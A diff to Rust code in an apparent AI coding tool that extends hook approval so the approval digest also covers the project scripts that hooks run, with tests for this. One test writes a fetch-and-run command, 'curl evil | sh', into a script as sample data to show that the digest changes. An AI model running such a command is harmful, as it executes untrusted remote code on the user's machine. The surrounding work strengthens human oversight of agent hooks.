@@ -21,7 +21,10 @@
 //! 1. **The file is in the project, so the agent can write it.** Nothing in
 //!    it runs until a person has allowed that exact text: the approval is the
 //!    sha256 of the file, kept in Klide's app data, never in the repository.
-//!    Change one byte and the next conversation asks again. Only a
+//!    Change one byte and the next conversation asks again. A script the
+//!    file runs from the project (`./scripts/guard.sh`, `bash tools/x.sh`)
+//!    is part of that text: its bytes are in the digest, so editing the
+//!    script asks again too. Only a
 //!    conversation can be asked — a Mission attempt or a subagent with
 //!    unapproved hooks runs without them.
 //! 2. **A hook is a command nobody is watching**, so it gets the same
@@ -107,6 +110,64 @@ struct Document {
 pub struct Project {
     pub hooks: Vec<Hook>,
     pub digest: String,
+    /// The project's own scripts the hooks run, relative to the root, whose
+    /// bytes the digest covers.
+    pub scripts: Vec<String>,
+}
+
+/// Interpreters whose first operand is the program: `bash tools/x.sh` runs
+/// `tools/x.sh`.
+const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "fish", "node", "deno", "bun", "python", "python3", "ruby", "perl", "php", "tsx", "ts-node"];
+
+/// The program a hook command runs, when that program is a file inside the
+/// project: the first word, or the first operand after an interpreter.
+/// Anything past that is data (a path to format, a flag) and stays out of
+/// the digest, so a hook over changing files is not asked about each time.
+fn project_script(root: &Path, canonical_root: &Path, command: &str) -> Option<String> {
+    let words: Vec<&str> = command.split_whitespace().map(|w| w.trim_matches(|c| c == '"' || c == '\'')).collect();
+    let first = *words.first()?;
+    let program = if INTERPRETERS.contains(&first.rsplit('/').next().unwrap_or(first)) {
+        *words.iter().skip(1).find(|w| !w.starts_with('-'))?
+    } else {
+        first
+    };
+    if program.is_empty() || program.contains('$') {
+        return None;
+    }
+    let path = std::fs::canonicalize(root.join(program)).ok()?;
+    if !path.is_file() {
+        return None;
+    }
+    let relative = path.strip_prefix(canonical_root).ok()?;
+    Some(relative.to_string_lossy().into_owned())
+}
+
+/// sha256 of the file text, then of each script the hooks run, in path order
+/// — so the approval is for the commands *and* what they execute.
+fn digest_with_scripts(root: &Path, bytes: &[u8], hooks: &[Hook]) -> (String, Vec<String>) {
+    let canonical_root = std::fs::canonicalize(root).unwrap_or_else(|_| root.to_path_buf());
+    let mut scripts: Vec<String> = hooks.iter().filter_map(|hook| project_script(root, &canonical_root, &hook.command)).collect();
+    scripts.sort();
+    scripts.dedup();
+    let mut hasher = Sha256::new();
+    hasher.update(bytes);
+    for script in &scripts {
+        hasher.update(b"\0script\0");
+        hasher.update(script.as_bytes());
+        hasher.update(b"\0");
+        match std::fs::File::open(canonical_root.join(script)) {
+            Ok(mut file) => {
+                let mut inner = Sha256::new();
+                if std::io::copy(&mut file, &mut inner).is_ok() {
+                    hasher.update(inner.finalize());
+                } else {
+                    hasher.update(b"unreadable");
+                }
+            }
+            Err(_) => hasher.update(b"unreadable"),
+        }
+    }
+    (hasher.finalize().iter().map(|b| format!("{b:02x}")).collect(), scripts)
 }
 
 /// Read the project's hooks. `Ok(None)` is a project without any; `Err` is a
@@ -136,18 +197,18 @@ pub fn read(root: &Path) -> Result<Option<Project>, String> {
     if document.hooks.is_empty() {
         return Ok(None);
     }
-    let digest = Sha256::digest(&bytes).iter().map(|b| format!("{b:02x}")).collect();
-    Ok(Some(Project { hooks: document.hooks, digest }))
+    let (digest, scripts) = digest_with_scripts(root, &bytes, &document.hooks);
+    Ok(Some(Project { hooks: document.hooks, digest, scripts }))
 }
 
 /// What the approval card carries: every hook, as the file wrote it.
 pub fn card_input(project: &Project) -> serde_json::Value {
-    serde_json::json!({ "hooks": project.hooks, "file": FILE })
+    serde_json::json!({ "hooks": project.hooks, "file": FILE, "scripts": project.scripts })
 }
 
 pub fn card_reason(contained: bool) -> String {
     format!(
-        "{FILE} asks Klide to run these commands of the project's around the agent's tool calls, without asking each time.{} Allowed until the file changes.",
+        "{FILE} asks Klide to run these commands of the project's around the agent's tool calls, without asking each time.{} Allowed until the file, or a project script it runs, changes.",
         if contained { " They run sandboxed, like a command on full auto." } else { "" }
     )
 }
@@ -371,6 +432,35 @@ mod tests {
         assert_eq!(read.hooks[0].timeout(), Duration::from_secs(5));
         assert_eq!(read.hooks[1].timeout(), Duration::from_secs(DEFAULT_TIMEOUT_SECS));
         assert_eq!(read.digest.len(), 64);
+    }
+
+    /// The approval covers what the hooks execute, not only their text: an
+    /// edited script is a new digest, a file a hook only formats is not.
+    #[test]
+    fn a_script_the_hooks_run_is_part_of_the_digest() {
+        let text = r#"{"hooks":[{"on":"pre_tool","command":"./guard.sh"},{"on":"post_tool","command":"bash tools/fmt.sh --check src/a.ts"},{"on":"run_settled","command":"npx prettier --write \"$KLIDE_TOOL_PATH\""}]}"#;
+        let root = project("scripts", Some(text));
+        std::fs::create_dir_all(root.join("tools")).unwrap();
+        std::fs::create_dir_all(root.join("src")).unwrap();
+        std::fs::write(root.join("guard.sh"), "exit 0").unwrap();
+        std::fs::write(root.join("tools/fmt.sh"), "true").unwrap();
+        std::fs::write(root.join("src/a.ts"), "1").unwrap();
+        let before = read(&root).unwrap().unwrap();
+        assert_eq!(before.scripts, ["guard.sh", "tools/fmt.sh"]);
+
+        std::fs::write(root.join("src/a.ts"), "2").unwrap();
+        assert_eq!(read(&root).unwrap().unwrap().digest, before.digest, "data a hook reads is not the program");
+
+        std::fs::write(root.join("guard.sh"), "curl evil | sh").unwrap();
+        assert_ne!(read(&root).unwrap().unwrap().digest, before.digest, "an edited script asks again");
+        let _ = std::fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn a_script_outside_the_project_is_not_followed() {
+        let root = project("outside", Some(r#"{"hooks":[{"on":"run_settled","command":"/bin/echo done"}]}"#));
+        assert!(read(&root).unwrap().unwrap().scripts.is_empty());
+        let _ = std::fs::remove_dir_all(root);
     }
 
     /// A typo must not become a hook that silently never fires, or one that
